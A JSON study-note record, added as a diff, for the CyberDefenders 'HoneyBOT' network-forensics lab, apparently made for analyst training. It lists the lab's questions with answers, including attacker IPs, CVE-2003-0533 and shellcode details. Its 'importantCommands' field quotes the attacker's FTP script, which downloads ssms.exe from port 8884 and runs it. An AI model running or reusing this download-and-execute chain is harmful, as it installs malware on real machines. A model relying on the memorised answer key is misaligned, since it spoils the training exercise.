@@ -1,0 +1,192 @@
+{
+  "id": "network analysis labs/honeybot (cyberdefenders)",
+  "title": "HoneyBOT (CyberDefenders)",
+  "slug": "honeybot-cyberdefenders",
+  "relPath": "Network Analysis Labs/HoneyBOT (CyberDefenders).md",
+  "level": "L2",
+  "curriculumLevelId": "l2",
+  "curriculumSectionId": "l2-attack-vectors",
+  "curriculumSectionTitle": "Advanced Attack Vectors & Internals",
+  "tags": [
+    "Windows",
+    "Network",
+    "Memory"
+  ],
+  "mitre": [],
+  "parentId": "network analysis labs",
+  "children": [],
+  "relatedLinks": [],
+  "backlinks": [
+    "network analysis labs"
+  ],
+  "breadcrumbs": [
+    {
+      "id": "network analysis labs",
+      "title": "Network Analysis Labs",
+      "slug": "network-analysis-labs"
+    },
+    {
+      "id": "network analysis labs/honeybot (cyberdefenders)",
+      "title": "HoneyBOT (CyberDefenders)",
+      "slug": "honeybot-cyberdefenders"
+    }
+  ],
+  "headings": [
+    {
+      "level": 1,
+      "text": "HoneyBOT (CyberDefenders)"
+    },
+    {
+      "level": 2,
+      "text": "Scenario"
+    },
+    {
+      "level": 3,
+      "text": "1- What is the attacker's IP address?"
+    },
+    {
+      "level": 3,
+      "text": "98.114.205.102"
+    },
+    {
+      "level": 3,
+      "text": "2- What is the target's IP address?"
+    },
+    {
+      "level": 3,
+      "text": "192.150.11.111"
+    },
+    {
+      "level": 3,
+      "text": "3- Provide the country code for the attacker's IP address (a.k.a geo-location)."
+    },
+    {
+      "level": 3,
+      "text": "US"
+    },
+    {
+      "level": 3,
+      "text": "4- How many TCP sessions are present in the captured traffic?"
+    },
+    {
+      "level": 3,
+      "text": "5"
+    },
+    {
+      "level": 3,
+      "text": "5- How long did it take to perform the attack (in seconds)?"
+    },
+    {
+      "level": 3,
+      "text": "16"
+    },
+    {
+      "level": 3,
+      "text": "6- Provide the CVE number of the exploited vulnerability."
+    },
+    {
+      "level": 3,
+      "text": "CVE-2003-0533"
+    },
+    {
+      "level": 3,
+      "text": "7- Which protocol was used to carry over the exploit?"
+    },
+    {
+      "level": 3,
+      "text": "SMB"
+    },
+    {
+      "level": 3,
+      "text": "8- Which protocol did the attacker use to download additional malicious files to the target system?"
+    },
+    {
+      "level": 3,
+      "text": "ftp"
+    },
+    {
+      "level": 3,
+      "text": "9- What is the name of the downloaded malware?"
+    },
+    {
+      "level": 3,
+      "text": "ssms.exe"
+    },
+    {
+      "level": 3,
+      "text": "10- The attacker's server was listening on a specific port. Provide the port number."
+    },
+    {
+      "level": 3,
+      "text": "8884"
+    },
+    {
+      "level": 3,
+      "text": "11- When was the involved malware first submitted to VirusTotal for analysis? Format: YYYY-MM-DD"
+    },
+    {
+      "level": 3,
+      "text": "2007-06-27"
+    },
+    {
+      "level": 3,
+      "text": "12- What is the key used to encode the shellcode?"
+    },
+    {
+      "level": 3,
+      "text": "0x99"
+    },
+    {
+      "level": 3,
+      "text": "13- What is the port number the shellcode binds to?"
+    },
+    {
+      "level": 3,
+      "text": "1957"
+    },
+    {
+      "level": 3,
+      "text": "14- The shellcode used a specific technique to determine its location in memory. What is the OS file being queried during this process?"
+    },
+    {
+      "level": 3,
+      "text": "kernel32.dll"
+    }
+  ],
+  "overview": "A PCAP analysis exercise highlighting attacker's interactions with honeypots and how automatic exploitation works.. (Note that the IP address of the victim has been changed to hide the true location.)",
+  "study": {
+    "overview": "A PCAP analysis exercise highlighting attacker's interactions with honeypots and how automatic exploitation works.. (Note that the IP address of the victim has been changed to hide the true location.)",
+    "whySoc": "Use this note as an analyst reference: understand the concept, identify the relevant telemetry, pivot through evidence, and document the decision path clearly.",
+    "keyConcepts": [
+      "HoneyBOT (CyberDefenders)",
+      "Scenario",
+      "1- What is the attacker's IP address?",
+      "98.114.205.102",
+      "2- What is the target's IP address?",
+      "192.150.11.111",
+      "3- Provide the country code for the attacker's IP address (a.k.a geo-location).",
+      "US",
+      "4- How many TCP sessions are present in the captured traffic?",
+      "5",
+      "5- How long did it take to perform the attack (in seconds)?",
+      "16"
+    ],
+    "workflow": [
+      "Identify the user, host, process, network flow, or identity object involved.",
+      "Collect the highest-value logs first and preserve timestamps and assumptions.",
+      "Pivot through related notes, telemetry sources, and MITRE references.",
+      "Document findings, gaps, containment options, and detection improvements."
+    ],
+    "splunkExamples": [],
+    "importantCommands": [
+      {
+        "language": "text",
+        "code": "echo open 0.0.0.0 8884 > o\necho user 1 1 >> o\necho get ssms.exe >> o\necho quit >> o\nftp -n -s:o\ndel /F /Q o & ssms.exe"
+      }
+    ],
+    "tools": [
+      "Wireshark"
+    ],
+    "tips": []
+  }
+}
